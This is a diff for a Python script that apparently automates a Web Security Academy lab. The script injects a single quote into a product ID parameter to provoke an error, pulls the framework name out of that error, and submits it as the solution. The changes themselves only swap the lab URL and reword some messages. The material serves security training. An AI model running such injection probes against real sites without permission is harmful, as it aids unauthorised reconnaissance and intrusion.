@@ -8,7 +8,7 @@
 #
 # Steps: 1. Inject a single quote in the product ID parameter to cause an error
 #        2. Extract the framework name
-#        3. Submit the answer
+#        3. Submit solution
 #
 ################################################################################
 
@@ -21,7 +21,7 @@ from colorama import Fore
 import base64
 
 # change this url to your lab
-url = "https://0a7d00d0045a445f827ac9d7003b00ce.web-security-academy.net"
+url = "https://0a3600d603f62f3580f894800013003a.web-security-academy.net"
 
 try:
     inject_payload = requests.get(
@@ -37,12 +37,12 @@ try:
         }
         try:
             submit_answer = requests.post(
-                f"{url}/submitsolution", data)  # submit the answer
+                f"{url}/submitsolution", data)  # submit solution
             if submit_answer.status_code == 200:
-                print(Fore.WHITE + "3. Submitting the answer.. " + Fore.GREEN + "OK")
+                print(Fore.WHITE + "3. Submitting solution.. " + Fore.GREEN + "OK")
                 print(
                     Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
         except:
-            print(Fore.RED + "[!] Failed to submit the answer")
+            print(Fore.RED + "[!] Failed to submit solution")
 except:
     print(Fore.RED + "[!] Failed to inject the payload")
